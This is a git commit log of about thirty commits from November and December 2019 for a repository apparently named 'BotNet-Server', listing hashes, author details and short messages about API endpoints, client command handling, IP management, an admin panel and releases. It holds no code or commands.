+    screen panel & screen exchanging preparation
+
+commit 4f42d6ba260f928ed8a0637d7a52955a26f73461
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Dec 4 18:24:48 2019 +0400
+
+    IP manage fix, command helper part 2 + Release 1.2.0
+
+commit b058c2e993484ccc7dfcba4a87faf8ef248c99f8
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Tue Dec 3 21:19:35 2019 +0400
+
+    command helper part 1
+
+commit 4d67bbe38928781802fcc9e475786fcc042e46a7
+Merge: ee6a279 7fe3a2f
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Dec 2 20:45:21 2019 +0400
+
+    Merge branch 'master' of https://github.com/Zerumi/BotNet-Server
+
+commit ee6a27975739e750394f48a52156415fe0a1f391
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Dec 2 20:43:35 2019 +0400
+
+    Add IP manage, UI sinc to IP manage
+
+commit 7fe3a2fe6cfe7021b5891ae00c3cda50f9faece8
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Mon Dec 2 16:14:16 2019 +0400
+
+    Update LICENSE
+
+commit 9572eb96196d6986c902a05edd3c1bcdcfb1fc7e
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Dec 1 19:59:07 2019 +0400
+
+    DELETE /ip/:id
+
+commit fe032762e8ba3a4a4e1eef87682292b0e63ae76c
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Nov 29 13:28:47 2019 +0400
+
+    Release 1.1.0
+
+commit 9f9ae6df9f651123d537bf7fee2ae2ae43cda638
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Nov 28 21:12:29 2019 +0400
+
+    add password request, UI fixes, program terminated fixes
+
+commit bbf5e703e9d9d99c70cfd8fc97ed35341c0a037c
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Nov 28 15:44:28 2019 +0400
+
+    added lock to admin panel, scroll textblock
+
+commit f0504d9f46b0bac994e088d784fbeee946300c90
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Nov 28 13:26:09 2019 +0400
+
+    release
+
+commit 33623115ff2985bba65027abfe8a28e10a4f337b
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Nov 28 13:08:57 2019 +0400
+
+    add infinitely get clients and responses
+
+commit fe3149cea0a1c9b64a9e17230a2f55776c37fd68
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Nov 27 23:00:55 2019 +0400
+
+    add listenclients, delete responses
+
+commit d66371dba2ee5d9858d39fe78a183d67c2f32295
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Nov 27 18:34:52 2019 +0400
+
+    add POST /api/v1/responses/:ip & GET responses fix
+
+commit 7151d57a369c5d789a0671ccdcb517872660ba53
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Nov 27 10:28:28 2019 +0400
+
+    add GET /api/v1/responses/:ip/:id
+
+commit a4b7a406f7947ce2228415076d86168665b52142
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Mon Nov 25 23:07:54 2019 +0400
+
+    Update README.md
+
+commit f01c77dc10ec3f17a95005f1a99f7caef78ca0df
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Nov 25 23:01:33 2019 +0400
+
+    Added post,delete commands to clients
+
+commit fd32f0e6749a90fe84cc5d8d5cb62bc321bf363b
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Nov 17 18:50:18 2019 +0400
+
+    part 2 of last commit
+
+commit 412b6606caaa14a8ff2d208f6573b7cddb121ae4
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Nov 17 18:48:55 2019 +0400
+
+    Fixed writing to .json
+
+commit 83819d9887155438d4258dc0ece93c554dd87869
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Nov 17 12:11:59 2019 +0400
+
+    Fixed POST send
+
+commit 817f187161d6c566e97f22e297ac6d375d79f580
+Merge: f90a9a9 76da23c
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sat Nov 16 16:25:08 2019 +0400
+
+    Merge branch 'master' of https://github.com/Zerumi/BotNet-Server
+
+commit f90a9a99b842e478f01e767757cdb9e06ecae950
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sat Nov 16 16:24:20 2019 +0400
+
+    Fixed POST handler
+
+commit 76da23c9691608e3f1b885f3957ad9d3b455d6b3
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Fri Nov 15 23:12:09 2019 +0400
+
+    Create LICENSE
+
+commit 160ddb2c393b22d5bd2aba36edae9e9cdbe54ee9
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Nov 15 23:05:34 2019 +0400
+
+    Fixed some API Bugs
+
+commit 4b980609531224bf4bca5f6339ecbb7d6d412b92
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Nov 14 23:42:46 2019 +0400
+
+    Added API, Ip of clients output
+
+commit f3de84f69f967f69ed6deae060c1dcdad7f3b43f
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Nov 13 22:34:30 2019 +0400
+
+    Created Example of API for interacting with server
+
+commit 3fcb4e8bc1b7831fedc855550625ad2173c18ae1
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Nov 13 21:04:39 2019 +0400
+
+    Added API for download it to the server
+
+commit 843d6950513aed84ff47c2c951d576f951393298
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Wed Nov 13 20:03:36 2019 +0400
+
+    Add UI for server control (Initial commit)
+
+commit ce029b8d96d675e32e63699ac130c8a0c63a90fe
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Wed Nov 13 19:52:45 2019 +0400
+
+    Initial commit
